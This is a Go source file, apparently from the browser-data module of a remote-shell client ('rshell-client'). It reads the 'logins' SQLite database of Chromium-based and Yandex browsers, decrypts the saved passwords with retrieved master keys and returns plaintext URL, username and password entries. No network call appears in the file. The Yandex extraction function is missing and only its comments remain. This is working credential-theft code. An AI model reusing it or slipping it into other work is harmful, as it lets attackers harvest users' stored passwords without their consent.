package chromium

import (
	"database/sql"
	"sort"

	"rshell-client/shared/hackbrowserdata/crypto/keyretriever"
	"rshell-client/shared/hackbrowserdata/types"
	"rshell-client/shared/hackbrowserdata/utils/sqliteutil"
)

const (
	defaultLoginQuery = `SELECT origin_url, username_value, password_value, date_created FROM logins`
	countLoginQuery   = `SELECT COUNT(*) FROM logins`

	yandexLoginQuery = `SELECT origin_url, username_element, username_value,
		password_element, password_value, signon_realm, date_created FROM logins`
)

func extractPasswords(keys keyretriever.MasterKeys, path string) ([]types.LoginEntry, error) {
	return extractPasswordsWithQuery(keys, path, defaultLoginQuery)
}

func extractPasswordsWithQuery(keys keyretriever.MasterKeys, path, query string) ([]types.LoginEntry, error) {
	logins, err := sqliteutil.QueryRows(path, false, query,
		func(rows *sql.Rows) (types.LoginEntry, error) {
			var url, username string
			var pwd []byte
			var created int64
			if err := rows.Scan(&url, &username, &pwd, &created); err != nil {
				return types.LoginEntry{}, err
			}
			password, _ := decryptValue(keys, pwd)
			return types.LoginEntry{
				URL:       url,
				Username:  username,
				Password:  string(password),
				CreatedAt: timeEpoch(created),
			}, nil
		})
	if err != nil {
		return nil, err
	}

	sort.Slice(logins, func(i, j int) bool {
		return logins[i].CreatedAt.After(logins[j].CreatedAt)
	})
	return logins, nil
}

// extractYandexPasswords walks Ya Passman Data; protocol in RFC-012 §4.
// Note: URL column is origin_url — it's what the per-row AAD is computed over (not action_url).

func countPasswords(path string) (int, error) {
	return sqliteutil.CountRows(path, false, countLoginQuery)
}

// yandexLoginAAD is SHA1(origin_url \x00 username_element \x00 username_value \x00 password_element \x00 signon_realm),
// with keyID appended when the profile has a master password (v1 always passes nil).

